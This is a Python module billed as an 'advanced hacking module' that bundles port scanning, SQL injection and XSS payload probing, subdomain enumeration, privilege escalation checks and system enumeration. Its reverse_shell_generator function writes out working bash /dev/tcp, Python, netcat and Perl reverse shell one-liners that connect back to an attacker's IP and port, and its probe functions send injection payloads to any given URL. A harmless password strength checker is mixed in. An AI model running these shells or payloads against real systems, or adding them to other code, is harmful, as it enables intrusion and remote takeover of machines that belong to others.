#!/usr/bin/env python3
"""
MATUS ADVANCED HACKING MODULE
Advanced security testing and reconnaissance tools
"""

import socket
import subprocess
import os
import sys
import json
import requests
from urllib.parse import urljoin, urlparse
import hashlib
import re

class AdvancedHacking:
    def __init__(self):
        self.results = {}
        self.verbose = True

    def port_scan_advanced(self, target, port_range="1-65535", timeout=2):
        """Advanced port scanning with service detection"""
        try:
            ports = self._parse_port_range(port_range)
            open_ports = []
            
            for port in ports[:100]:  # Limit to first 100 for speed
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(timeout)
                    result = sock.connect_ex((target, port))
                    if result == 0:
                        try:
                            service = socket.getservbyport(port)
                        except:
                            service = "Unknown"
                        open_ports.append({"port": port, "service": service, "status": "open"})
                    sock.close()
                except Exception as e:
                    pass
            
            return {
                "target": target,
                "open_ports": open_ports,
                "total_scanned": len(ports),
                "open_count": len(open_ports)
            }
        except Exception as e:
            return {"error": str(e)}

    def vulnerability_scan(self, url):
        """Scan for common vulnerabilities"""
        vulns = []
        
        try:
            # Check for common headers
            response = requests.get(url, timeout=5)
            headers = response.headers
            
            if 'X-Frame-Options' not in headers:
                vulns.append({"type": "Clickjacking", "severity": "Medium", "recommendation": "Add X-Frame-Options header"})
            
            if 'X-Content-Type-Options' not in headers:
                vulns.append({"type": "MIME Type Sniffing", "severity": "Low", "recommendation": "Add X-Content-Type-Options: nosniff"})
            
            if 'Strict-Transport-Security' not in headers:
                vulns.append({"type": "HSTS Missing", "severity": "Medium", "recommendation": "Enable HSTS"})
            
            # Check for common paths
            common_paths = ['/admin', '/wp-admin', '/.git', '/.env', '/config.php', '/database.yml']
            for path in common_paths:
                try:
                    resp = requests.get(urljoin(url, path), timeout=2)
                    if resp.status_code == 200:
                        vulns.append({"type": "Exposed Path", "path": path, "severity": "High"})
                except:
                    pass
            
            return {"url": url, "vulnerabilities": vulns, "count": len(vulns)}
        except Exception as e:
            return {"error": str(e)}

    def sql_injection_test(self, url, param):
        """Test for SQL injection vulnerabilities"""
        payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "admin' --",
            "' UNION SELECT NULL--",
            "1' AND '1'='1"
        ]
        
        vulnerable = []
        for payload in payloads:
            try:
                test_url = f"{url}?{param}={payload}"
                response = requests.get(test_url, timeout=5)
                if any(indicator in response.text.lower() for indicator in ['error', 'sql', 'syntax']):
                    vulnerable.append({"payload": payload, "indicator": "Error message"})
            except:
                pass
        
        return {"url": url, "parameter": param, "vulnerable": len(vulnerable) > 0, "payloads_tested": len(payloads)}

    def xss_detection(self, url):
        """Detect XSS vulnerabilities"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')"
        ]
        
        results = []
        for payload in xss_payloads:
            try:
                response = requests.get(f"{url}?q={payload}", timeout=5)
                if payload in response.text:
                    results.append({"payload": payload, "reflected": True})
            except:
                pass
        
        return {"url": url, "xss_found": len(results) > 0, "payloads_tested": len(xss_payloads)}

    def dns_enumeration(self, domain):
        """Enumerate DNS records"""
        try:
            # Get A record
            a_record = socket.gethostbyname(domain)
            
            # Try common subdomains
            subdomains = []
            common_subs = ['www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'admin', 'api']
            
            for sub in common_subs:
                try:
                    ip = socket.gethostbyname(f"{sub}.{domain}")
                    subdomains.append({"subdomain": f"{sub}.{domain}", "ip": ip})
                except:
                    pass
            
            return {
                "domain": domain,
                "a_record": a_record,
                "subdomains": subdomains,
                "subdomains_found": len(subdomains)
            }
        except Exception as e:
            return {"error": str(e)}

    def password_strength_check(self, password):
        """Analyze password strength"""
        score = 0
        feedback = []
        
        if len(password) >= 8:
            score += 1
        else:
            feedback.append("Password should be at least 8 characters")
        
        if any(c.isupper() for c in password):
            score += 1
        else:
            feedback.append("Add uppercase letters")
        
        if any(c.islower() for c in password):
            score += 1
        else:
            feedback.append("Add lowercase letters")
        
        if any(c.isdigit() for c in password):
            score += 1
        else:
            feedback.append("Add numbers")
        
        if any(c in "!@#$%^&*" for c in password):
            score += 1
        else:
            feedback.append("Add special characters")
        
        strength = ["Very Weak", "Weak", "Fair", "Good", "Strong", "Very Strong"][score]
        
        return {
            "password_length": len(password),
            "strength": strength,
            "score": score,
            "feedback": feedback
        }

    def reverse_shell_generator(self, attacker_ip, attacker_port, shell_type="bash"):
        """Generate reverse shell payloads"""
        shells = {
            "bash": f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1",
            "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{attacker_ip}\",{attacker_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            "nc": f"nc -e /bin/sh {attacker_ip} {attacker_port}",
            "perl": f"perl -e 'use Socket;$i=\"{attacker_ip}\";$p={attacker_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
        }
        
        return {
            "shells": shells,
            "attacker_ip": attacker_ip,
            "attacker_port": attacker_port,
            "available_types": list(shells.keys())
        }

    def privilege_escalation_check(self):
        """Check for privilege escalation vectors"""
        vectors = []
        
        # Check if running as root
        if os.geteuid() == 0:
            vectors.append({"vector": "Already running as root", "severity": "Critical"})
        
        # Check for sudo
        try:
            result = subprocess.run(['sudo', '-l'], capture_output=True, timeout=2)
            if result.returncode == 0:
                vectors.append({"vector": "Sudo privileges available", "severity": "High"})
        except:
            pass
        
        # Check for SUID binaries
        try:
            result = subprocess.run(['find', '/usr/bin', '-perm', '-4000'], capture_output=True, timeout=5)
            suid_count = len(result.stdout.decode().split('\n'))
            vectors.append({"vector": f"SUID binaries found: {suid_count}", "severity": "Medium"})
        except:
            pass
        
        return {"vectors": vectors, "total_found": len(vectors)}

    def system_enumeration(self):
        """Comprehensive system enumeration"""
        try:
            info = {
                "os": os.name,
                "platform": sys.platform,
                "user": os.getenv('USER', 'unknown'),
                "home": os.getenv('HOME', 'unknown'),
                "cwd": os.getcwd(),
                "python_version": sys.version,
                "uid": os.getuid(),
                "gid": os.getgid(),
            }
            
            # Get environment variables
            env_vars = dict(os.environ)
            
            return {
                "system_info": info,
                "env_vars_count": len(env_vars),
                "is_root": os.geteuid() == 0 if hasattr(os, 'geteuid') else False
            }
        except Exception as e:
            return {"error": str(e)}

    def _parse_port_range(self, port_range):
        """Parse port range string"""
        if '-' in port_range:
            start, end = map(int, port_range.split('-'))
            return list(range(start, min(end + 1, 65536)))
        else:
            return [int(port_range)]

# Export functions
def advanced_port_scan(target, ports="1-1000"):
    hacking = AdvancedHacking()
    return hacking.port_scan_advanced(target, ports)

def advanced_vuln_scan(url):
    hacking = AdvancedHacking()
    return hacking.vulnerability_scan(url)

def advanced_sql_injection(url, param):
    hacking = AdvancedHacking()
    return hacking.sql_injection_test(url, param)

def advanced_xss_detection(url):
    hacking = AdvancedHacking()
    return hacking.xss_detection(url)

def advanced_dns_enum(domain):
    hacking = AdvancedHacking()
    return hacking.dns_enumeration(domain)

def advanced_password_check(password):
    hacking = AdvancedHacking()
    return hacking.password_strength_check(password)

def advanced_reverse_shell(ip, port, shell_type="bash"):
    hacking = AdvancedHacking()
    return hacking.reverse_shell_generator(ip, port, shell_type)

def advanced_priv_esc_check():
    hacking = AdvancedHacking()
    return hacking.privilege_escalation_check()

def advanced_sys_enum():
    hacking = AdvancedHacking()
    return hacking.system_enumeration()
